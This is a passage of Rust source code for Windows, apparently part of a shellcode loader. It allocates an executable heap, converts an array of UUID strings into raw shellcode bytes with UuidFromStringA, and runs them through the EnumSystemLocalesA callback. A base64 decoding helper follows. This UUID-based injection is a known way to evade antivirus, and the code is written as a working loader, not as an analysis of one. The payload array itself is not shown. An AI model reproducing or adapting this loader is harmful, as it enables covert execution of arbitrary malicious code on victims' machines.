unsafe {
    // Creating and Allocating Heap Memory

    let h_heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    let h_addr = HeapAlloc(h_heap, 0, 0x100000);
        
    let mut p_addr = h_addr as DWORD_PTR;


    // Planting Shellcode From UUID Array onto Allocated Heap Memory
    for i in 0..SIZE {
        let cstr = CString::new(uuidarr[i]).unwrap();
        let g_addr = cstr.as_ptr() as *mut u8;
        let status: RPC_STATUS = UuidFromStringA(g_addr, p_addr as *mut GUID);
        if status != windows::Win32::System::Rpc::RPC_STATUS(0) {
            if status == windows::Win32::System::Rpc::RPC_STATUS(1705) {
                process::exit(0x0001);
            }
        }
        p_addr += 16;
    }

    // Calling the Callback Function
    EnumSystemLocalesA(transmute::<*mut winapi::ctypes::c_void, LOCALE_ENUMPROCA>(h_addr), 0);
    CloseHandle(h_heap);
    process::exit(0x0000);
}
}

fn base64_decode(shellcode:String)->String{
let x = base64::decode_config(shellcode,base64::STANDARD_NO_PAD).unwrap();
String::from_utf8(x).unwrap()
}